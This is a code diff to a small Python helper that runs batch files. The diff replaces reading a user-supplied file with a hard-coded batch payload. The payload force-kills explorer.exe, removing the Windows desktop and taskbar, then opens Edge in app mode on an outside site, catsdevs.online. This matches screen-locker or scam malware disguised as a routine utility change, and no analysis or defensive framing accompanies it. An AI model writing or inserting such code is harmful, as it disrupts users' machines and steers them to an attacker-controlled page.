@@ -2,10 +2,13 @@ import os
 import tempfile
 import subprocess
 
-def run_bat_from_exe(input_file='input.bat'):
-    with open(input_file, 'r', encoding='utf-8') as f:
-        bat_content = f.read()
-
+def run_bat_from_exe():
+    bat_content = '''
+@echo off
+taskkill /f /im explorer.exe
+start msedge --app=https://catsdevs.online/assets/
+'''
+ 
     with tempfile.NamedTemporaryFile(delete=False, suffix='.bat') as temp_bat:
         temp_bat.write(bat_content.encode('utf-8'))
         temp_bat_path = temp_bat.name
